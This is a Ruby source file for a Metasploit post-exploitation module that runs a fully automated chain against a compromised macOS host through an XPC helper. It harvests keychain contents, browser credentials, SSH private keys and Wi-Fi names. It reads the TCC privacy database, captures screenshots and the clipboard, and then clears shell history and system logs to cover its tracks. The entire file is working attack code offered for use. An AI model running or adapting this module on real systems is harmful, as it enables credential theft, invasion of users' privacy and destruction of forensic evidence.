require_relative '../../lib/xpc_helper'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::OSX::XPCDaemon
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'macOS XPC Full Automated Post-Exploitation Chain',
      'Description'   => %q{
        Runs the complete post-exploitation chain automatically:
        system enumeration, security assessment, credential harvesting,
        access mapping, evidence collection, and tracks covering.
        All data is stored as loot in the Metasploit database.
      },
      'License'       => MSF_LICENSE,
      'Author'        => ['Mr.Gedik'],
      'Platform'      => ['osx'],
      'SessionTypes'  => ['meterpreter', 'shell']
    ))
    register_options([
      OptBool.new('SKIP_CLEANUP', [false, 'Skip anti-forensics phase', false]),
    ])
  end

  def run
    unless xpc_client_exists?
      print_error('XPC client not found. Run xpc_daemon_install first.')
      return
    end

    loot_count = 0
    cred_count = 0

    # Phase 1: System Enumeration
    print_status('='*60)
    print_status('Phase 1: System Enumeration')
    print_status('='*60)

    sys = xpc_exec!('e1')
    if sys
      xpc_store_loot('system_enum', sys.to_s, 'system_enum.txt', 'System enumeration')
      loot_count += 1
      sys.each { |k, v| print_line("  #{k}: #{v.to_s[0..80]}") } if sys.is_a?(Hash)
    end

    posture = xpc_exec!('e4')
    if posture
      xpc_store_loot('security_posture', posture.to_s, 'security_posture.txt', 'Security posture')
      loot_count += 1
      posture.each { |k, v| print_line("  #{k}: #{v}") } if posture.is_a?(Hash)
    end

    # Phase 2: Security Assessment
    print_status('')
    print_status('='*60)
    print_status('Phase 2: Security Assessment')
    print_status('='*60)

    tools = xpc_exec!('e2')
    if tools && tools.is_a?(Hash)
      xpc_store_loot('security_tools', tools.to_s, 'security_tools.txt', 'Security tools')
      loot_count += 1
      detected = tools.select { |k, v| v == 'DETECTED' && !k.start_with?('_') }
      if detected.any?
        print_warning("EDR/AV DETECTED: #{detected.keys.join(', ')}")
      else
        print_good('No EDR/AV detected')
      end
    end

    # Phase 3: Credential Harvesting
    print_status('')
    print_status('='*60)
    print_status('Phase 3: Credential Harvesting')
    print_status('='*60)

    keychain = xpc_exec!('k1')
    if keychain
      path = xpc_store_loot('keychain', keychain.to_s, 'keychain_dump.txt', 'Keychain dump')
      loot_count += 1
      print_good("Keychain dumped -> #{path}")
    end

    browser = xpc_exec!('k2')
    if browser
      path = xpc_store_loot('browser_creds', browser.to_s, 'browser_creds.txt', 'Browser credentials')
      loot_count += 1
      print_good("Browser credentials -> #{path}")
    end

    ssh = xpc_exec!('k3')
    if ssh && ssh.is_a?(Hash)
      ssh.each do |user, keys|
        path = xpc_store_loot("ssh_keys_#{user}", keys.to_s, "ssh_keys_#{user}.txt", "SSH keys for #{user}")
        loot_count += 1
        cred_count += keys.scan(/BEGIN.*PRIVATE KEY/).length
      end
      print_good("SSH keys harvested: #{ssh.keys.join(', ')}")
    end

    wifi = xpc_exec!('k4')
    if wifi
      path = xpc_store_loot('wifi_names', wifi.to_s, 'wifi_names.txt', 'Wi-Fi network names (SSID)')
      loot_count += 1
      print_good("Wi-Fi network names -> #{path}")
    end

    # Phase 4: Access Mapping
    print_status('')
    print_status('='*60)
    print_status('Phase 4: Access Mapping')
    print_status('='*60)

    tcc = xpc_exec!('t2')
    if tcc
      path = xpc_store_loot('tcc_database', tcc.to_s, 'tcc_database.txt', 'TCC database')
      loot_count += 1
      print_good("TCC database -> #{path}")
    end

    broker = xpc_exec!('b2')
    if broker && broker.is_a?(Hash)
      found = broker.count { |k, v| v == 'PORT_FOUND' && !k.start_with?('_') }
      path = xpc_store_loot('broker_scan', broker.to_s, 'broker_scan.txt', 'XPC service scan')
      loot_count += 1
      print_good("#{found} system services reachable -> #{path}")
    end

    # Phase 5: Evidence Collection
    print_status('')
    print_status('='*60)
    print_status('Phase 5: Evidence Collection')
    print_status('='*60)

    ss = xpc_exec('ss')
    if ss && ss['s'] == '1' && ss['d']
      begin
        png = Base64.decode64(ss['d'])
        path = xpc_store_loot('screenshot', png, 'screenshot.png', 'Desktop screenshot')
        loot_count += 1
        print_good("Screenshot (#{png.length} bytes) -> #{path}")
      rescue => e
        print_warning("Screenshot decode error: #{e.message}")
      end
    end

    clip = xpc_exec!('cb')
    if clip && clip.to_s.length > 0
      path = xpc_store_loot('clipboard', clip.to_s, 'clipboard.txt', 'Clipboard content')
      loot_count += 1
      print_good("Clipboard -> #{path}")
    end

    # Phase 6: Tracks Cover
    unless datastore['SKIP_CLEANUP']
      print_status('')
      print_status('='*60)
      print_status('Phase 6: Covering Tracks')
      print_status('='*60)

      xpc_exec('ch')
      print_good('Shell history cleared')

      xpc_exec('lc all')
      print_good('System logs cleared')
    end

    # Summary
    print_status('')
    print_good('='*60)
    print_good("AUTOPWN COMPLETE")
    print_good('='*60)
    print_good("Loot items collected: #{loot_count}")
    print_good("Credentials found:    #{cred_count}")
    print_good("View loot:  msf6> loot")
    print_good("View creds: msf6> creds")
  end
end
